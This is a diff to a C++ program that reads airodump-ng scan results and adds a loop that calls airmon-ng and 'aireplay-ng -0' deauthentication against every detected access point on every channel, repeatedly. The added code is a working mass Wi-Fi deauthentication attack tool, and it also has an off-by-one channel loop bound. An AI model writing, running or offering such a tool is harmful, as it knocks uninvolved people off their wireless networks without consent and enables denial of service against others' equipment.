@@ -1,3 +1,8 @@
+#include <unistd.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <stdio.h>
+
 #include <iostream>
 #include <cstdlib>
 #include <string>
@@ -18,6 +23,8 @@ using std::ifstream;
 using std::getline;
 using std::stringstream;
 using std::system;
+using std::to_string;
+using std::find;
 
 vector<string> split(const string &s, char delim);
 string trim(const string& str);
@@ -53,6 +60,7 @@ int main(int argc, const char* argv[]){
     };
 
     vector < wireless_network > w_networks;
+    vector < int > channels;
 
     string line;
     ifstream file;
@@ -74,15 +82,33 @@ int main(int argc, const char* argv[]){
                 network.channel =  stoi( trim( tokens[3] ) );
                 network.essid = trim( tokens[13] );
                 w_networks.push_back( network );
+                bool exist = false;
+                for(int x = 0; x < channels.size(); x++){
+                    if( channels[ x ] == network.channel ){
+                        exist = true;
+                    }
+                }
+                if(!exist){
+                    channels.push_back(network.channel);
+                }
             }
         }
     }
     file.close();
 
-    cout << w_networks[0].essid << endl;
+    for( int i = 0; i < iterations; i++ ){
+        for( int j = 0; j <= channels.size(); j++ ){
+            string command = "airmon-ng start " + interface + " " + to_string( channels[j] );
+            system( command.c_str() );
+            for( int k = 0; k < w_networks.size(); k++ ){
+                if( w_networks[ k ].channel ==  channels[j] ){
+                    string command = "aireplay-ng -0 4 -a " + w_networks[ k ].bssid + " " + interface;
+                    system( command.c_str() );
+                }
+            }
+        }
+    }
 
-    //int x = system("macvendor --no-update b4:82:fe:cf:12:28");
-    
     return 0;
 }
 
@@ -98,8 +124,7 @@ vector<string> split(const string &s, char delim) {
 
 string trim(const string& str){
     size_t first = str.find_first_not_of(' ');
-    if (string::npos == first)
-    {
+    if (string::npos == first){
         return str;
     }
     size_t last = str.find_last_not_of(' ');
